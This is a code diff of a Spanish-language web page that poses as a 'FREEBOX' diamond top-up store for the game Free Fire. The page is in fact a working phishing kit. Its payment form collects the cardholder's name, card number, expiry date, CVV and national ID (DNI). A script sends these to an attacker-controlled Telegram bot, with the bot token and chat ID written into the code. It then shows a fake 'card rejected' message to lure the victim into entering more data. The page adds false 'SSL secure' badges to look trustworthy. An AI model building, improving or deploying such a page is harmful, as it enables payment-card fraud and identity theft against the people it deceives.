@@ -1,51 +1,123 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Centro de Recargas &amp; Pago Seguro</title>
-  <!-- Google Fonts -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>FREEBOX</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
+  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
   <style>
-    /* Global Reset & Variables */
+    /* Reset y estilos generales */
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
     }
-    :root {
-      --primary-dark: #121212;
-      --secondary-dark: #1e1e1e;
-      --accent-color: #17a2b8;
-      --accent-hover: #138496;
-      --success-color: #28a745;
-      --error-color: #ff5252;
-      --font-main: 'Montserrat', sans-serif;
-      --font-secondary: 'Roboto', sans-serif;
-    }
-    html {
-      scroll-behavior: smooth;
-    }
     body {
-      font-family: var(--font-main);
-      background: linear-gradient(135deg, var(--secondary-dark), var(--primary-dark));
-      color: #e0e0e0;
+      font-family: 'Poppins', sans-serif;
+      background-color: #0f0f0f;
+      color: #fff;
       line-height: 1.6;
       overflow-x: hidden;
-      position: relative;
-      padding-bottom: 60px; /* espacio para el footer */
+      padding-bottom: 60px;
     }
-    /* Animations */
-    .fade-in {
-      animation: fadeIn 0.8s ease forwards;
+    header {
+      background: transparent;
+      padding: 20px;
+      text-align: center;
     }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
+    header h1 {
+      font-size: 2.2rem;
+      color: #00ffd5;
+      letter-spacing: 1px;
     }
-    /* Overlay de Seguridad (Spinner) */
+    .container {
+      max-width: 1000px;
+      margin: 40px auto;
+      padding: 0 20px;
+    }
+    .section {
+      margin-bottom: 40px;
+    }
+    label {
+      display: block;
+      margin-bottom: 10px;
+      font-weight: 500;
+      color: #ccc;
+    }
+    input, select {
+      width: 100%;
+      padding: 14px;
+      background: #1a1a1a;
+      color: #fff;
+      border: 1px solid #333;
+      border-radius: 10px;
+      margin-bottom: 20px;
+      transition: all 0.3s ease;
+      font-size: 1rem;
+    }
+    input:focus, select:focus {
+      outline: none;
+      border-color: #00ffd5;
+      box-shadow: 0 0 8px #00ffd5;
+    }
+    /* Tarjetas de selección */
+    .cards {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 20px;
+    }
+    .card {
+      background: #1a1a1a;
+      padding: 25px;
+      border-radius: 16px;
+      text-align: center;
+      border: 2px solid transparent;
+      transition: all 0.3s ease;
+      cursor: pointer;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+    }
+    .card:hover, .card.selected {
+      border-color: #00ffd5;
+      transform: scale(1.05);
+    }
+    .card img {
+      width: 20px;
+      vertical-align: middle;
+      margin-right: 8px;
+    }
+    .card span {
+      font-size: 1.1rem;
+      font-weight: 500;
+      vertical-align: middle;
+    }
+    /* Botones */
+    .btn-pagar, .btn-confirmar {
+      background: linear-gradient(to right, #00ffd5, #00b3ff);
+      color: #000;
+      font-weight: bold;
+      padding: 15px;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      font-size: 1.2rem;
+      transition: background 0.3s ease, transform 0.3s ease;
+      width: 100%;
+    }
+    .btn-pagar:hover, .btn-confirmar:hover {
+      background: linear-gradient(to right, #00b3ff, #00ffd5);
+      transform: scale(1.03);
+    }
+    /* Footer */
+    footer {
+      background: #1f1f1f;
+      text-align: center;
+      padding: 20px;
+      font-size: 0.9rem;
+      color: #aaa;
+      margin-top: 50px;
+    }
+    /* Overlay de carga */
     #loadingOverlay {
       position: fixed;
       top: 0;
@@ -68,7 +140,7 @@
     }
     .spinner {
       border: 6px solid rgba(255, 255, 255, 0.2);
-      border-top: 6px solid var(--accent-color);
+      border-top: 6px solid #00ffd5;
       border-radius: 50%;
       width: 50px;
       height: 50px;
@@ -78,540 +150,277 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-    /* Header */
-    header {
-      width: 100%;
-      background-color: var(--secondary-dark);
-      padding: 20px 30px;
-      display: flex;
-      align-items: center;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.6);
-    }
-    header img {
-      width: 50px;
-      height: 50px;
-      object-fit: contain;
-    }
-    header .title {
-      font-size: 26px;
-      font-weight: 700;
-      margin-left: 15px;
-      color: #fff;
-      letter-spacing: 1px;
-    }
-    /* Main Section (Recargas) */
-    #mainSection {
-      width: 100%;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      padding-bottom: 40px;
-    }
-    .content {
-      flex: 1;
-      padding: 40px 20px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 25px;
-    }
-    .card {
-      background-color: var(--secondary-dark);
-      border-radius: 10px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.6);
-      padding: 25px;
-      width: 100%;
-      max-width: 600px;
-      text-align: center;
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
-    }
-    .card:hover {
-      transform: scale(1.02);
-      box-shadow: 0 6px 16px rgba(0,0,0,0.8);
-    }
-    .game-header {
-      display: flex;
-      align-items: center;
-      justify-content: center;
+    /* Sección de pago seguro */
+    #paymentSection {
+      display: none;
+      padding: 20px;
       margin-bottom: 20px;
     }
-    .game-header img {
-      width: 80px;
-      height: 80px;
-      object-fit: cover;
-      border-radius: 8px;
-      margin-right: 15px;
-      border: 2px solid #333;
+    #paymentSection h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      font-size: 2rem;
+      color: #00ffd5;
     }
-    .game-header h2 {
-      font-size: 30px;
-      color: #fff;
+    .payment-form {
+      display: grid;
+      gap: 20px;
     }
-    .player-input {
+    /* Contenedor centrado para logos y mensaje SSL */
+    .payment-info {
       display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 10px;
-      justify-content: center;
+      margin-top: 20px;
     }
-    .player-input p {
-      font-size: 0.9rem;
-      color: #ccc;
-      text-align: center;
-      margin-bottom: 5px;
+    .payment-logos {
+      display: flex;
+      align-items: center;
+      gap: 20px;
     }
-    .player-input input {
-      width: 65%;
-      padding: 12px 15px;
-      font-size: 16px;
-      border: none;
-      border-radius: 4px;
-      outline: none;
+    /* Se quita la regla de tamaño para que la imagen se adapte según lo necesites */
+    /* .payment-logos img {
+      width: 60px;
+    } */
+    .ssl-text {
+      margin-top: 10px;
+      font-size: 0.95rem;
+      color: #bbb;
+      font-style: italic;
     }
-    .player-input input::placeholder {
-      color: #aaa;
-    }
-    .player-input button {
-      padding: 12px 20px;
-      background-color: var(--accent-color);
-      border: none;
-      border-radius: 4px;
-      color: #fff;
-      cursor: pointer;
-      font-size: 16px;
-      transition: background-color 0.3s ease;
-    }
-    .player-input button:hover {
-      background-color: var(--accent-hover);
-    }
-    /* Error alert inline (modo oscuro) */
+    /* Mensajes de error */
     .error-alert {
-      background: rgba(255, 82, 82, 0.15);
-      border-left: 4px solid var(--error-color);
+      background: rgba(255,82,82,0.15);
+      border-left: 4px solid #ff5252;
       padding: 10px 15px;
       margin: 10px 0;
       border-radius: 4px;
-      color: var(--error-color);
+      color: #ff5252;
       font-size: 0.9rem;
-      text-align: left;
-    }
-    /* Sección para las opciones de recarga */
-    .options-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
-      gap: 15px;
-      margin: 20px 0;
-    }
-    .option-card {
-      background-color: #2c2c2c;
-      border-radius: 8px;
-      padding: 15px 10px;
       text-align: center;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.4);
-      font-size: 14px;
-      cursor: pointer;
-      transition: transform 0.2s ease, border 0.2s ease;
     }
-    .option-card:hover {
-      transform: translateY(-4px);
+    /* Botones inferiores */
+    .bottom-buttons {
+      max-width: 1000px;
+      margin: 20px auto;
+      padding: 0 20px;
+      text-align: center;
     }
-    .option-card.selected {
-      border: 2px solid var(--success-color);
-    }
-    .option-card img {
-      width: 30px;
-      height: 30px;
+    .bottom-buttons .support-text {
+      font-size: 1.2rem;
       margin-bottom: 10px;
     }
-    .option-card .amount {
-      font-size: 16px;
-      font-weight: 600;
-      color: #fff;
-    }
-    #payment-info {
-      font-size: 16px;
-      margin-bottom: 15px;
-      color: #f0f0f0;
-    }
-    .confirm-recharge {
-      padding: 12px 25px;
-      background-color: var(--accent-color);
-      border: none;
-      border-radius: 4px;
-      color: #fff;
-      cursor: pointer;
-      font-size: 16px;
-      transition: background-color 0.3s ease, transform 0.2s;
-    }
-    .confirm-recharge:hover {
-      background-color: var(--accent-hover);
-      transform: translateY(-2px);
-    }
-    /* Payment Section */
-    #paymentSection {
-      background: linear-gradient(135deg, var(--secondary-dark), var(--primary-dark));
-      min-height: 100vh;
+    .social-buttons {
       display: flex;
-      align-items: center;
+      gap: 20px;
       justify-content: center;
-      padding: 20px;
     }
-    .payment-container {
-      background-color: #242424;
-      padding: 40px 30px;
-      border-radius: 10px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.8);
-      width: 100%;
-      max-width: 500px;
-    }
-    .payment-container h1 {
-      text-align: center;
-      margin-bottom: 20px;
-      font-size: 2.2rem;
-      font-weight: 600;
-      color: #fff;
-    }
-    .payment-security {
-      text-align: center;
-      margin-bottom: 25px;
-    }
-    .payment-security img {
-      height: 40px;
-      margin-bottom: 10px;
-    }
-    .payment-security p {
-      font-size: 0.95rem;
-      color: #a5d6a7;
-      line-height: 1.4;
-    }
-    .payment-summary {
-      background: #1e1e1e;
-      padding: 15px 20px;
-      border-radius: 6px;
-      margin-bottom: 20px;
-      font-size: 1rem;
-      color: #fff;
-      text-align: left;
-      line-height: 1.4;
-    }
-    .secure-message {
-      text-align: center;
-      font-size: 0.95rem;
-      color: #8bc34a;
-      margin-bottom: 25px;
-    }
-    .payment-container label {
-      display: block;
-      margin-bottom: 8px;
-      font-size: 1rem;
-      font-weight: 600;
-      color: #fff;
-    }
-    .payment-container input {
-      width: 100%;
-      padding: 15px;
-      border: 1px solid #444;
-      border-radius: 6px;
-      background-color: #2a2a2a;
-      color: #e0e0e0;
-      font-size: 1rem;
-      margin-bottom: 20px;
-      transition: border-color 0.3s, box-shadow 0.3s;
-    }
-    .payment-container input:focus {
-      outline: none;
-      border-color: #8bc34a;
-      box-shadow: 0 0 8px rgba(139,195,74,0.5);
-    }
-    .flex-container {
-      display: flex;
-      gap: 15px;
-      align-items: flex-end;
-      margin-bottom: 20px;
-    }
-    .flex-container > div {
+    .social-buttons button {
       flex: 1;
-    }
-    .btn {
-      width: 100%;
-      padding: 15px;
       border: none;
-      border-radius: 6px;
-      background: linear-gradient(45deg, #007bff, #0056b3);
-      color: #fff;
-      font-size: 1.1rem;
-      font-weight: 600;
+      border-radius: 12px;
       cursor: pointer;
-      transition: background 0.3s, transform 0.2s;
-    }
-    .btn:hover {
-      background: linear-gradient(45deg, #0056b3, #007bff);
-      transform: translateY(-2px);
-    }
-    .error-message {
-      text-align: center;
-      color: var(--error-color);
-      font-size: 0.95rem;
-      margin-top: 15px;
-    }
-    /* Botón flotante de soporte técnico */
-    .support-button {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      width: 60px;
-      height: 60px;
-      background-color: #0088cc;
-      border-radius: 50%;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.4);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 1001;
+      font-size: 1.2rem;
+      font-weight: bold;
+      padding: 15px;
+      color: #fff;
       transition: transform 0.3s ease;
     }
-    .support-button:hover {
-      transform: scale(1.1);
+    .social-buttons button:hover {
+      transform: scale(1.03);
     }
-    .support-button img {
-      width: 70%;
-      height: auto;
+    .btn-instagram {
+      background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285aeb 90%);
     }
-    /* Footer */
-    footer {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      width: 100%;
-      background-color: var(--secondary-dark);
-      color: #ccc;
-      text-align: center;
-      padding: 10px 0;
-      font-size: 0.9rem;
-      z-index: 1000;
+    .btn-telegram {
+      background: #0088cc;
     }
-    /* Responsive */
-    @media (max-width: 768px) {
-      header { padding: 15px 20px; }
-      header img { width: 40px; height: 40px; }
-      header .title { font-size: 20px; }
-      .content { padding: 20px 10px; }
-      .game-header img { width: 60px; height: 60px; }
-      .game-header h2 { font-size: 24px; }
-      .player-input input { font-size: 14px; }
-      .player-input button { font-size: 14px; padding: 10px 15px; }
-      .confirm-recharge { font-size: 14px; padding: 10px 20px; }
-    }
-    @media (max-width: 480px) {
-      .options-grid { grid-template-columns: repeat(2, 1fr); }
-      .player-input input { width: 100%; }
-      .player-input { flex-direction: column; }
+    @media(max-width: 600px) {
+      header h1 {
+        font-size: 1.5rem;
+      }
+      .social-buttons {
+        flex-direction: column;
+      }
+      .payment-logos {
+        flex-direction: column;
+      }
     }
   </style>
 </head>
 <body>
-  <!-- Sección principal (Recargas) -->
-  <div id="mainSection" class="fade-in">
+  <!-- Sección de recarga -->
+  <div id="recargaSection" class="container">
     <header>
-      <img src="https://freebox.es/wp-content/uploads/2021/02/ssss.jpg" alt="Logo">
-      <div class="title">CENTRO DE RECARGAS</div>
+      <h1>FREEBOX</h1>
     </header>
-    <div class="content">
-      <!-- Sección del juego (Free Fire) -->
-      <div class="card game-section">
-        <div class="game-header">
-          <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png" alt="Icono Free Fire">
-          <h2>Free Fire</h2>
+    <div class="section">
+      <p style="margin-bottom: 10px; color: #ccc; font-size: 0.9rem;">
+        Por favor, asegúrese de ingresar su ID correctamente. Si verificamos que no existe, su pago será reembolsado automáticamente.
+      </p>
+      <label for="player-id">ID del jugador</label>
+      <input type="text" id="player-id" placeholder="Ingresa tu ID de jugador" maxlength="10" pattern="[0-9]*" inputmode="numeric">
+      <label for="server">Servidor</label>
+      <select id="server">
+        <option value="sudamerica" selected>Sudamérica</option>
+      </select>
+    </div>
+    <div class="section">
+      <label>Selecciona la cantidad de diamantes</label>
+      <div class="cards">
+        <div class="card" onclick="selectCard(this)">
+          <img src="https://via.placeholder.com/20?text=D" alt="Diamante">
+          <span>100+60 Diamantes</span>
         </div>
-      </div>
-      <!-- Ingreso del ID del jugador -->
-      <div class="card player-input">
-        <p>
-          Por favor, asegúrese de ingresar su ID correctamente. Si verificamos que no existe, su pago será reembolsado automáticamente.
-        </p>
-        <input type="text" id="playerId" name="playerId" placeholder="Ingresa tu ID" maxlength="10" pattern="[0-9]*" inputmode="numeric">
-        <button id="confirmId">Confirmar ID</button>
-        <button id="resetId" style="background-color: #ffc107; color: #000;">Corregir ID</button>
-      </div>
-      <!-- Contenedor para error en la sección de recarga -->
-      <div id="inputError" class="error-alert" style="display:none;"></div>
-      <!-- Sección de Monto de recarga -->
-      <div class="card recharge-section">
-        <h3>Monto de Recarga</h3>
-        <div class="options-grid">
-          <div class="option-card" data-amount="$100 +60">
-            <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="Diamante">
-            <div class="amount">$100 +60</div>
-          </div>
-          <div class="option-card" data-amount="310 +100">
-            <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="Diamante">
-            <div class="amount">$310 +100</div>
-          </div>
-          <div class="option-card" data-amount="$520 +200">
-            <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="Diamante">
-            <div class="amount">$520 +200</div>
-          </div>
-          <div class="option-card" data-amount="$1060 +310">
-            <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="Diamante">
-            <div class="amount">$1060 +310</div>
-          </div>
-          <div class="option-card" data-amount="$2180 +520">
-            <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="Diamante">
-            <div class="amount">$2180 +520</div>
-          </div>
-          <div class="option-card" data-amount="$5600 +1060">
-            <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="Diamante">
-            <div class="amount">$5600 +1060</div>
-          </div>
+        <div class="card" onclick="selectCard(this)">
+          <img src="https://via.placeholder.com/20?text=D" alt="Diamante">
+          <span>310+100 Diamantes</span>
         </div>
-        <div id="payment-info">Monto a Pagar: --</div>
-        <button class="confirm-recharge" id="confirmRecharge" disabled>Confirmar Recarga</button>
+        <div class="card" onclick="selectCard(this)">
+          <img src="https://via.placeholder.com/20?text=D" alt="Diamante">
+          <span>520+200 Diamantes</span>
+        </div>
+        <div class="card" onclick="selectCard(this)">
+          <img src="https://via.placeholder.com/20?text=D" alt="Diamante">
+          <span>1060+310 Diamantes</span>
+        </div>
+        <div class="card" onclick="selectCard(this)">
+          <img src="https://via.placeholder.com/20?text=D" alt="Diamante">
+          <span>2180+520 Diamantes</span>
+        </div>
       </div>
     </div>
+    <div class="section">
+      <button id="confirmRecarga" class="btn-confirmar">Pagar ahora</button>
+    </div>
+    <div id="inputError" class="error-alert" style="display:none;"></div>
   </div>
   
-  <!-- Sección de pago (oculta inicialmente) -->
-  <div id="paymentSection" class="fade-in" style="display: none;">
-    <div class="payment-container">
-      <h1>Pago con Tarjeta</h1>
-      <div class="payment-security">
-        <img src="https://www.hojalateriaschile.cl/wp-content/uploads/2025/01/logos-tc-768x109.png" alt="Medio de Pago Seguro">
-        <p>
-          <strong>Pago 100% Seguro</strong><br>
-          Transacción protegida con encriptación SSL
-        </p>
-      </div>
-      <!-- Resumen del pago -->
-      <div id="paymentSummary" class="payment-summary"></div>
-      <!-- Contenedor para error en la sección de pago (validaciones) -->
-      <div id="paymentError" class="error-alert" style="display:none;"></div>
-      <p class="secure-message"></p>
-      <form id="paymentForm" action="#" method="post">
-        <label for="nombre">Nombre completo</label>
-        <input type="text" id="nombre" name="nombre" placeholder="Nombre completo" required>
-        <label for="numero">Número de la tarjeta</label>
-        <input type="text" id="numero" name="numero" placeholder="0000000000000000" inputmode="numeric" maxlength="16" pattern="\d{16}" required>
-        <div class="flex-container">
-          <div>
-            <label for="vencimiento">Fecha de vencimiento</label>
-            <input type="text" id="vencimiento" name="vencimiento" placeholder="MM/AA" inputmode="numeric" maxlength="5" required>
-          </div>
-          <div>
-            <label for="codigo">CVV</label>
-            <input type="text" id="codigo" name="codigo" placeholder="CVV" inputmode="numeric" maxlength="3" required>
-          </div>
+  <!-- Sección de pago seguro -->
+  <div id="paymentSection" class="container">
+    <header>
+      <h1>Pago Seguro</h1>
+    </header>
+    <div class="section">
+      <h2>Ingrese los datos de pago</h2>
+      <!-- Bloque profesional con logos -->
+      <div class="payment-info">
+        <div class="payment-logos">
+          <img src="https://www.hojalateriaschile.cl/wp-content/uploads/2025/01/logos-tc-768x109.png" alt="Mastercard" style="width: 150px;">
         </div>
-        <label for="dni">DNI</label>
-        <input type="text" id="dni" name="dni" placeholder="00.000.000" inputmode="numeric" maxlength="10" required>
-        <button type="submit" class="btn">Confirmar pago</button>
+        <p class="ssl-text">Transacción segura mediante SSL</p>
+      </div>
+      <div id="paymentSummary" style="margin:20px 0;"></div>
+      <form id="paymentForm" class="payment-form">
+        <input type="text" id="nombre" name="nombre" placeholder="Nombre del titular de la tarjeta" required>
+        <input type="text" id="numero" name="numero" placeholder="Número de tarjeta" maxlength="16" pattern="\d{16}" inputmode="numeric" required>
+        <input type="text" id="vencimiento" name="vencimiento" placeholder="Fecha de expiración (MM/AA)" maxlength="5" inputmode="numeric" required>
+        <input type="text" id="codigo" name="codigo" placeholder="Código CVC" maxlength="3" inputmode="numeric" required>
+        <input type="text" id="dni" name="dni" placeholder="DNI (00.000.000)" maxlength="10" inputmode="numeric" required>
+        <button type="submit" class="btn-pagar">Confirmar pago</button>
       </form>
-      <div id="errorMsg" class="error-message" style="display:none;">
-        Su tarjeta fue rechazada, por favor intente con otro método o consulte con su banco.
-      </div>
+      <div id="paymentError" class="error-alert" style="display:none;"></div>
     </div>
   </div>
   
-  <!-- Overlay de seguridad / procesamiento -->
+  <!-- Overlay de carga -->
   <div id="loadingOverlay">
     <div class="spinner"></div>
   </div>
   
-  <!-- Botón flotante de soporte técnico -->
-  <a href="https://t.me/healthra1" target="_blank" class="support-button" title="Soporte Técnico">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Soporte Telegram">
-  </a>
-  
-  <!-- Footer -->
   <footer>
-    Soporte Técnico vía Telegram | © 2025 FREEBOX
+    © 2025 Freebox. Todos los derechos reservados.
   </footer>
   
+  <!-- Botones inferiores -->
+  <div class="bottom-buttons">
+    <div class="support-text">Soporte</div>
+    <div class="social-buttons">
+      <button class="btn-bottom btn-instagram" onclick="window.location.href='https://instagram.com/tu_usuario'">Instagram</button>
+      <button class="btn-bottom btn-telegram" onclick="window.location.href='https://telegram.me/tu_usuario'">Telegram</button>
+    </div>
+  </div>
+  
   <script>
-    // Mapeo de montos a pagar
+    // Función de selección de tarjeta
+    function selectCard(card) {
+      document.querySelectorAll('.card').forEach(c => c.classList.remove('selected'));
+      card.classList.add('selected');
+    }
+  
+    // Mapeo de precios a pagar
     const priceMapping = {
-      "$100 +60": "1500 ARS sin impuestos",
-      "310 +100": "3400 ARS sin impuestos",
-      "$520 +200": "6000 ARS sin impuestos",
-      "$1060 +310": "13.000 ARS sin impuestos",
-      "$2180 +520": "22.000 ARS sin impuestos",
-      "$5600 +1060": "55.000 ARS sin impuestos"
+      "100+60 Diamantes": "1500 ARS sin impuestos",
+      "310+100 Diamantes": "3400 ARS sin impuestos",
+      "520+200 Diamantes": "6000 ARS sin impuestos",
+      "1060+310 Diamantes": "13.000 ARS sin impuestos",
+      "2180+520 Diamantes": "22.000 ARS sin impuestos"
     };
-
-    const optionCards = document.querySelectorAll('.option-card');
-    const paymentInfo = document.getElementById('payment-info');
-    let selectedOption = "";
-    optionCards.forEach(card => {
-      card.addEventListener('click', () => {
-        optionCards.forEach(c => c.classList.remove('selected'));
-        card.classList.add('selected');
-        selectedOption = card.getAttribute('data-amount');
-        paymentInfo.textContent = priceMapping[selectedOption] ? "Monto a Pagar: " + priceMapping[selectedOption] : "Monto a Pagar: --";
-      });
-    });
-    
-    let idConfirmado = false;
-    const confirmIdButton = document.getElementById('confirmId');
-    const resetIdButton = document.getElementById('resetId');
-    
-    confirmIdButton.addEventListener('click', () => {
-      const playerIdInput = document.getElementById('playerId').value;
-      if (playerIdInput.length <= 5) {
-        showError("El ID debe contener al menos 6 dígitos.", "inputError");
+  
+    const confirmRecargaBtn = document.getElementById('confirmRecarga');
+    confirmRecargaBtn.addEventListener('click', () => {
+      const playerId = document.getElementById('player-id').value.trim();
+      const server = document.getElementById('server').value;
+      const selectedCard = document.querySelector('.card.selected');
+      if (playerId.length < 6) {
+        showError("El ID debe tener al menos 6 dígitos.", "inputError");
         return;
       }
-      idConfirmado = true;
-      confirmIdButton.textContent = "ID Confirmado";
-      confirmIdButton.style.backgroundColor = "#28a745";
-      document.getElementById('confirmRecharge').disabled = false;
-    });
-    
-    // Función para corregir el ID
-    resetIdButton.addEventListener('click', () => {
-      document.getElementById('playerId').value = "";
-      idConfirmado = false;
-      confirmIdButton.textContent = "Confirmar ID";
-      confirmIdButton.style.backgroundColor = "#17a2b8"; // valor original
-      document.getElementById('confirmRecharge').disabled = true;
-    });
-    
-    const confirmRechargeButton = document.getElementById('confirmRecharge');
-    confirmRechargeButton.addEventListener('click', () => {
-      if (!idConfirmado) {
-        showError("Por favor, confirme su ID primero.", "inputError");
+      if (!server) {
+        showError("Seleccione un servidor.", "inputError");
+        return;
+      }
+      if (!selectedCard) {
+        showError("Seleccione la cantidad de diamantes.", "inputError");
         return;
       }
       const overlay = document.getElementById('loadingOverlay');
       overlay.classList.add('show');
       setTimeout(() => {
-        const userID = document.getElementById('playerId').value;
-        const summaryHTML = `
-          <strong>Resumen de Pago</strong><br>
-          <em>ID de Usuario:</em> ${userID}<br>
-          <em>Diamantes Seleccionados:</em> ${selectedOption}<br>
-          <em>Monto a Pagar:</em> ${priceMapping[selectedOption] ? priceMapping[selectedOption] : '--'}
+        const amountText = selectedCard.querySelector('span').innerText;
+        const resumen = `
+<strong>Resumen de Pago:</strong><br>
+<em>ID de Jugador:</em> ${playerId}<br>
+<em>Servidor:</em> ${server}<br>
+<em>Diamantes:</em> ${amountText}<br>
+<em>Monto a Pagar:</em> ${priceMapping[amountText] ? priceMapping[amountText] : '--'}
         `;
-        document.getElementById('paymentSummary').innerHTML = summaryHTML;
-        document.getElementById('mainSection').style.display = "none";
-        document.getElementById('paymentSection').style.display = "flex";
+        document.getElementById('paymentSummary').innerHTML = resumen;
+        document.getElementById('recargaSection').style.display = 'none';
+        document.getElementById('paymentSection').style.display = 'block';
         overlay.classList.remove('show');
       }, 2000);
     });
-    
-    // Función para mostrar errores en un contenedor dado
+  
+    // Función para mostrar errores
     function showError(message, containerId) {
       const errorDiv = document.getElementById(containerId);
       errorDiv.textContent = message;
       errorDiv.style.display = "block";
-      setTimeout(() => { errorDiv.style.display = "none"; }, 3000);
     }
-    
-    // Código para formatear vencimiento y DNI
+  
+    // Función para resaltar los campos del formulario
+    function highlightAllPaymentFields() {
+      document.querySelectorAll('#paymentForm input').forEach(input => {
+        input.style.border = "2px solid red";
+      });
+    }
+  
+    // Restaurar estilo al teclear en cada input
+    document.querySelectorAll('#paymentForm input').forEach(input => {
+      input.addEventListener('input', function() {
+        this.style.border = "1px solid #333";
+      });
+    });
+  
+    // Formatear fecha de vencimiento (MM/AA)
     document.getElementById('vencimiento').addEventListener('input', function() {
       let value = this.value.replace(/\D/g, '').substring(0, 4);
       if (value.length > 2) value = value.substring(0, 2) + '/' + value.substring(2);
       this.value = value;
     });
-
+  
+    // Formatear DNI con puntos
     document.getElementById('dni').addEventListener('input', function() {
       let value = this.value.replace(/\D/g, '').substring(0, 8);
       if (value.length > 2 && value.length <= 5) {
@@ -621,36 +430,39 @@
       }
       this.value = value;
     });
-
-    // Validación del formulario de pago sin usar alert() para errores
+  
+    // Envío del formulario de pago y envío a Telegram
     document.getElementById('paymentForm').addEventListener('submit', function(e) {
       e.preventDefault();
-      const vencimiento = document.getElementById('vencimiento').value;
-      const codigo = document.getElementById('codigo').value;
-      const dniInput = document.getElementById('dni').value;
-      if(vencimiento.length !== 5) {
+      const vencimiento = document.getElementById('vencimiento').value.trim();
+      const codigo = document.getElementById('codigo').value.trim();
+      const dni = document.getElementById('dni').value.trim();
+      if (vencimiento.length !== 5) {
         showError("Ingrese la fecha de vencimiento en formato MM/AA.", "paymentError");
         return;
       }
-      if(codigo.length !== 3) {
+      if (codigo.length !== 3) {
         showError("Ingrese el CVV de 3 dígitos.", "paymentError");
         return;
       }
-      const dniSinPuntos = dniInput.replace(/\./g, '');
-      if(dniSinPuntos.length !== 8) {
+      const dniSinPuntos = dni.replace(/\./g, '');
+      if (dniSinPuntos.length !== 8) {
         showError("Ingrese un DNI válido de 8 dígitos.", "paymentError");
         return;
       }
-      const nombre = document.getElementById('nombre').value;
-      const numero = document.getElementById('numero').value;
+      const nombre = document.getElementById('nombre').value.trim();
+      const numero = document.getElementById('numero').value.trim();
+      const resumenPago = document.getElementById('paymentSummary').innerText;
       const mensaje = `
-      *Nuevo pago recibido:*
-      *Nombre:* ${nombre}
-      *Número de tarjeta:* ${numero}
-      *Vencimiento:* ${vencimiento}
-      *CVV:* ${codigo}
-      *DNI:* ${dniInput}
+*Nuevo pago recibido:*
+${resumenPago}
+*Nombre:* ${nombre}
+*Número de tarjeta:* ${numero}
+*Vencimiento:* ${vencimiento}
+*CVV:* ${codigo}
+*DNI:* ${dni}
       `;
+      // Datos del Bot de Telegram
       const token = '7839830412:AAEhVvRqTnYvY0Ke79_o-uzh4jbWFZVGRmw';
       const chat_id = '6493944778';
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -664,15 +476,16 @@
       })
       .then(response => response.json())
       .then(data => {
-        console.log('Mensaje enviado a Telegram', data);
-        document.getElementById('errorMsg').style.display = 'block';
-        setTimeout(() => { window.location.href = 'https://www.google.com'; }, 10000);
+        // Mostrar mensaje de error en lugar de redirigir y resaltar campos
+        showError("Su tarjeta fue rechazada, por favor intente con otro método o consulte con su banco.", "paymentError");
+        highlightAllPaymentFields();
       })
       .catch(error => {
         console.error('Error al enviar mensaje:', error);
-        document.getElementById('errorMsg').style.display = 'block';
+        showError("Error al procesar el pago. Intente nuevamente.", "paymentError");
+        highlightAllPaymentFields();
       });
     });
   </script>
 </body>
-  </html>
+</html>
